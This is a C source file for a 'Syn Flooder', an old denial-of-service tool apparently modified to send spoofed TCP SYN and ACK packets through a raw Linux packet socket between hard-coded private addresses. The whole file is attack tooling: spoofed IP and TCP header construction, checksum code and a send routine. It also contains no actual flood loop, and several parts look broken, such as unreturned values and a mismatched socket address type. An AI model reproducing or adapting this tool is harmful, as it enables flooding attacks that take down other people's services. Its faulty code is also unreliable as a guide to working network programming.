/* Syn Flooder by Zakath
 * TCP Functions by trurl_ (thanks man).
 * All other code by Zakath.
 * Not too cosemtic right now, just finished beta version. No docs on
 * how to use - figure it out yourself. Change the usleep() below depending
 * on your bandwidth / desired effect.
 *
 * [3.22.96]
 */

#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <linux/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>

#define SEQ 0x28374839
#define BUF_SIZE 1024

unsigned long send_seq, ack_seq, srcport;
char flood = 0;
int sock, ssock;

typedef struct
{
    unsigned long src_ip;
    unsigned long src_port;
    unsigned long des_ip;
    unsigned long des_port;
}sd_info;

/* Check Sum */
unsigned short
ip_sum (addr, len)
u_short *addr;
int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > 1)
    {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1)
    {
        *(u_char *) (&answer) = *(u_char *) w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);   /* add hi 16 to low 16 */
    sum += (sum >> 16);           /* add carry */
    answer = ~sum;                /* truncate to 16 bits */
    return (answer);
}

unsigned long getaddr(char *name)
{
    struct hostent *hep;

    hep=gethostbyname(name);
    if(!hep)
    {
        fprintf(stderr, "Unknown host %s\n", name);
        exit(-1);
    }
    return *(unsigned long *)hep->h_addr;
}


void send_tcp_segment(struct iphdr *ih, struct tcphdr *th, char *data, int dlen)
{
    char buf[65536];
    struct    /* rfc 793 tcp pseudo-header */
    {
        unsigned long saddr, daddr;
        char mbz;
        char ptcl;
        unsigned short tcpl;
    } ph;

    struct sockaddr_in sin;	/* how necessary is this, given that the destination
				   address is already in the ip header? */

    ph.saddr=ih->saddr;
    ph.daddr=ih->daddr;
    ph.mbz=0;
    ph.ptcl=IPPROTO_TCP;
    ph.tcpl=htons(sizeof(*th)+dlen);

    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf+sizeof(ph), th, sizeof(*th));
    memcpy(buf+sizeof(ph)+sizeof(*th), data, dlen);
    memset(buf+sizeof(ph)+sizeof(*th)+dlen, 0, 4);
    th->check=ip_sum(buf, (sizeof(ph)+sizeof(*th)+dlen+1)&~1);

    memcpy(buf, ih, 4*ih->ihl);
    memcpy(buf+4*ih->ihl, th, sizeof(*th));
    memcpy(buf+4*ih->ihl+sizeof(*th), data, dlen);
    memset(buf+4*ih->ihl+sizeof(*th)+dlen, 0, 4);

    ih->check=ip_sum(buf, (4*ih->ihl + sizeof(*th)+ dlen + 1) & ~1);
    memcpy(buf, ih, 4*ih->ihl);

    sin.sin_family=AF_INET;
    sin.sin_port=th->dest;
    sin.sin_addr.s_addr=ih->daddr;

    if(sendto(ssock, buf, 4*ih->ihl + sizeof(*th)+ dlen, 0,
              &sin, sizeof(sin))<0)
    {
		printf("ssock = %p\n", ssock);
		printf("buf = %p\n", buf);
        printf("Error sending syn packet.\n");
        perror("");
        exit(-1);
    }
}

unsigned long spoof_open(unsigned long src_ip, unsigned long des_ip, unsigned short des_port)
{
    struct iphdr ih;
    struct tcphdr th;
    char buf[1024];
    struct timeval tv;

    ih.version=4;
    ih.ihl=5;
    ih.tos=0;			/* XXX is this normal? */
    ih.tot_len=sizeof(ih)+sizeof(th);
    ih.id=htons(random());
    ih.frag_off=0;
    ih.ttl=30;
    ih.protocol=IPPROTO_TCP;
    ih.check=0;
    ih.saddr=src_ip;
    ih.daddr=des_ip;

    th.source=htons(srcport);
    th.dest=htons(des_port);
    th.seq=htonl(SEQ);
    th.doff=sizeof(th)/4;
    th.ack_seq=0;
    th.res1=0;
    th.fin=0;
    th.syn=1;
    th.rst=0;
    th.psh=0;
    th.ack=0;
    th.urg=0;
//    th.res2=0;
    th.window=htons(65535);
    th.check=0;
    th.urg_ptr=0;

    send_tcp_segment(&ih, &th, "", 0);

    send_seq = SEQ+1+strlen(buf);
}

unsigned long spoof_ack(unsigned long src_ip, unsigned long des_ip, unsigned short des_port)
{
    struct iphdr ih;
    struct tcphdr th;
    char buf[1024];
    struct timeval tv;

    ih.version=4;
    ih.ihl=5;
    ih.tos=0;			/* XXX is this normal? */
    ih.tot_len=sizeof(ih)+sizeof(th);
    ih.id=htons(random());
    ih.frag_off=0;
    ih.ttl=30;
    ih.protocol=IPPROTO_TCP;
    ih.check=0;
    ih.saddr=src_ip;
    ih.daddr=des_ip;

    th.source=htons(srcport);
    th.dest=htons(des_port);
    th.seq=htonl(SEQ);
    th.doff=sizeof(th)/4;
    th.ack_seq=0;
    th.res1=0;
    th.fin=0;
    th.syn=0;
    th.rst=0;
    th.psh=0;
    th.ack=1;
    th.urg=0;
//    th.res2=0;
    th.window=htons(65535);
    th.check=0;
    th.urg_ptr=0;

    send_tcp_segment(&ih, &th, "GET / HTTP/1.1", strlen("GET / HTTP/1.1"));

    send_seq = SEQ+1+strlen(buf);
}

int main(int argc, char **argv)
{
    int i;
    sd_info *send_info = (sd_info *)malloc(sizeof(sd_info));
    unsigned long des_ip, src_ip;
    unsigned long src_port, des_port;
    char *buf = (char *)malloc(BUF_SIZE);
	struct ifreq ifr;
	char *device = "ens33";
	struct sockaddr_ll sll;

	memset(&sll, 0, sizeof(struct sockaddr_ll));
	memset(&ifr, 0, sizeof(struct ifreq));

	ssock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
	if(ssock<0)
	{
		perror("socket (raw)");
		return -1;
	}

	strncpy((char *)ifr.ifr_name, device, IFNAMSIZ);
	if(ioctl(ssock, SIOCGIFINDEX, (char *) &ifr))
	{
		perror("ioctl");
		return -1;
	}

    src_ip=getaddr("192.168.168.248");
    des_ip=getaddr("192.168.168.69");
    src_port=atoi("80");
    des_port=atoi("80");
    srcport = src_port;

//    ssock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifr.ifr_ifindex;
	sll.sll_protocol = htons(ETH_P_IP);
    if(bind(ssock, (struct sockaddr*) &sll, sizeof(sll)) == -1)
    {
        perror("bind");
        exit(-1);
    }

    printf("flooding. each dot equals 25 packets.\n");

    spoof_open(/*0xe1e26d0a*/ src_ip, des_ip, des_port);
	
	memset(buf, 0, BUF_SIZE);
    if(recv(ssock, buf, BUF_SIZE, 0) < 0)
    {
        perror("recv");
        exit(-1);
    }
	
    spoof_ack(/*0xe1e26d0a*/ src_ip, des_ip, des_port);
    printf(".");

    printf("\nFlood completed.\n");

    free(send_info);
    send_info = 0;
	free(buf);
	buf = 0;
    return 0;
}
